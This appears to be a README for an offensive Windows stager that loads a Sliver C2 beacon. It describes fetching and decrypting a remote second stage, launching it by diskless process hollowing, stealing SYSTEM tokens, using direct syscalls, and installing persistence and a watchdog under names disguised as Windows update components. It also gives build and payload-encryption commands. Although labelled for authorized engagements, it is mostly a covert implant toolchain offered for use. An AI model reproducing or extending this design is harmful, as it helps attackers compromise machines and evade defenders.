# sliverstagerv3

Windows stager for a Sliver C2 beacon. Downloads, decrypts, and launches a
second-stage beacon from a remote URL; optionally installs persistence and
a watchdog.

> Research / authorized-engagement use only.

## What the stager does

A single x86-64 Windows PE (`stager-v3.exe`) built from `src/main_stager.c`:

1. **Fetch.** Uses WinInet to GET the stage-2 blob from `STAGE2_URL`.
2. **Decrypt.** Accepts two payload formats:
   - `SLVRSTG1` headered format produced by `encrypt.py` (header + embedded
     key bytes + padding metadata). Default.
   - Raw XOR with a compile-time `STAGE2_XOR_KEY` (legacy).
3. **Spawn.** Runs the decrypted PE in one of two contexts based on
   `STAGE_SPAWN_MODE`:
   - `user` — execute as the current user. No token work.
   - `system` — steal a SYSTEM token and launch from a SYSTEM context.
     Implemented in `token_utils.{c,h}`. Configurable strictness, optional
     fallback to user, optional in-process reflective fallback.
4. **Execute.** PE is launched via process-hollowing (diskless) by default.
   Disk-staged execution is gated behind
   `STAGE_ALLOW_DISK_STAGED_EXECUTION`.
5. **Persist (optional).** `STAGE_PERSISTENCE` + `STAGE_PERSISTENCE_MODE`:
   - `0` — none
   - `1` — SYSTEM service (`WaaSUpdateMonitorSvc` name by default)
   - `2` — scheduled task
   - `3` — both
   Implementation in `persistence.{c,h}`. Legacy artifact names are removed
   on install.
6. **Watchdog (optional).** `STAGE_WATCHDOG=1` installs a scheduled
   relaunch task under `\Microsoft\Windows\UpdateOrchestrator\Watchdog` to
   re-spawn the beacon if it dies. Implementation in `watchdog.{c,h}`.

All runtime behavior is controlled via compile-time `#define`s, injected
into a temporary copy of `main_stager.c` by the build driver. Defaults live
at the top of `main_stager.c`; per-build values come from
`.sliverstagerv3.config`.

### Relevant source files

| File | Role |
|---|---|
| `src/main_stager.c` | Entry point, fetch + decrypt + spawn orchestration |
| `src/token_utils.c/h` | SYSTEM token acquisition + context switching |
| `src/persistence.c/h` | Service + scheduled task install/uninstall |
| `src/watchdog.c/h` | Relaunch watchdog scheduled task |
| `syscalls-x64.asm` | Direct syscalls (`STAGE_USE_SYSCALLS=1`) |
| `encrypt.py` | Builds `SLVRSTG1`-headered encrypted payloads |

## Build pipeline

Builds run on a remote Windows host because the stager uses MSVC-specific
intrinsics and COM / syscall paths. The local driver is `remote-build.sh`
(macOS/Linux); the remote compile runs under `build-remote.bat` on the
Windows host.

```
local (mac/linux)                remote (windows + MSVC)
┌─────────────────┐   ssh/scp    ┌────────────────────────┐
│ remote-build.sh │ ───────────▶ │ build-remote.bat       │
│  reads config   │              │  discovers VS 2019/22  │
│  injects #defs  │              │  compiles main_stager  │
│  uploads src    │              │  links syscalls-x64    │
│                 │ ◀─────────── │  writes stager-v3.exe  │
└─────────────────┘   scp back   └────────────────────────┘
```

1. `remote-build.sh` loads `.sliverstagerv3.config`, validates required
   values (refuses to run if any are empty).
2. Injects `STAGE2_URL`, `STAGE2_XOR_KEY`, and the spawn / persistence /
   watchdog flags as `/D` macros into a scratch copy of `main_stager.c`.
3. `scp`s sources + `build-remote.bat` to the Windows host.
4. Invokes `build-remote.bat` over SSH. The batch file discovers VS
   (2019 or 2022, Server SKU or Desktop) and runs `cl.exe` + `ml64.exe`.
5. Pulls the resulting `stager-v3.exe` back into `output/`.

### Setup

```bash
cp .sliverstagerv3.config.example .sliverstagerv3.config
# edit .sliverstagerv3.config and fill in real values
chmod +x remote-build.sh
./remote-build.sh
```

Required config keys — all must be set (real config is gitignored):

- `WIN_VM_IP`, `WIN_USER`, `WIN_SSH_PASSWORD` — remote build host
- `C2_DOMAIN`, `C2_PORT`, `STAGE2_URL` — second-stage location
- `XOR_KEY` — 32-byte hex, fresh per build (`openssl rand -hex 16`)
- `STAGE_SPAWN_MODE`, `STAGE_PERSISTENCE`, `STAGE_WATCHDOG`, … — runtime
  behavior flags (see `.sliverstagerv3.config.example` for the full list)

### Driver usage

```bash
./remote-build.sh                                          # interactive menu
./remote-build.sh build --mode system --persistence both   # system + both persistence
./remote-build.sh build --mode user --persistence off      # user, no persistence
./remote-build.sh build-only --watchdog                    # compile only
./remote-build.sh test                                     # SSH + toolchain sanity
./remote-build.sh plan                                     # print resolved config
```

### Beacon prep

```bash
python3 encrypt.py stage.exe stage-encrypted.bin --key "$XOR_KEY"
# host output/stage-encrypted.bin at STAGE2_URL
```

## Files

- `remote-build.sh`, `build-remote.bat` — build drivers
- `src/main_stager.c` + `src/token_utils.*` + `src/persistence.*` + `src/watchdog.*`
- `syscalls-x64.asm`
- `encrypt.py`
- `.sliverstagerv3.config.example` — config template (real config is
  gitignored)
